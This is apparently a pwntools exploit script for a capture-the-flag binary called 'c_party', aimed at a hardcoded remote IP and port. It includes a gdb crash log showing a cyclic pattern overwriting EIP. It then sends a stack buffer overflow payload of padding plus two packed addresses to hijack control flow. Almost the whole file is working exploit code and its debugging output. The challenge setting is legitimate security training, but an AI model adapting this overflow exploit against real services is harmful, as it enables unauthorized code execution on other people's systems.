#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='c_party'
TIME=0.02
if (len(sys.argv)>1):
    elf=ELF(binaire)
#    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    host='localhost'
    port=59994
else:
    elf=ELF(binaire)
#    libc=ELF('libc-chall.so.6')
    host='89.38.210.128'
    port=31338


p=remote(host,port)

def waitmenu():
    return(p.recvuntil("Password:"))


'''
ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLM
Principal got your message ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQR

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x0000005b  EBX: 0x48484747  ECX: 0xffffaa70  EDX: 0xf7f9c870  o d I t S z a p c 
  ESI: 0x44444343  EDI: 0x46464545  EBP: 0x4a4a4949  ESP: 0xffffcff0  EIP: 0x4c4c4b4b
  CS: 0023  DS: 002b  ES: 002b  FS: 0000  GS: 0063  SS: 002bError while running hook_stop:
Cannot access memory at address 0x4c4c4b4b
0x4c4c4b4b in ?? ()
(gdb) RSSTTUUVVWWXXYYZZ@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLM
Undefined command: "RSSTTUUVVWWXXYYZZ".  Try "help".
(gdb) 
'''
pause()
p.sendline("ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHIIJJKKLL"+p32(0x804a210)+p32(0x8048afb))

print p.recvall(2)


               
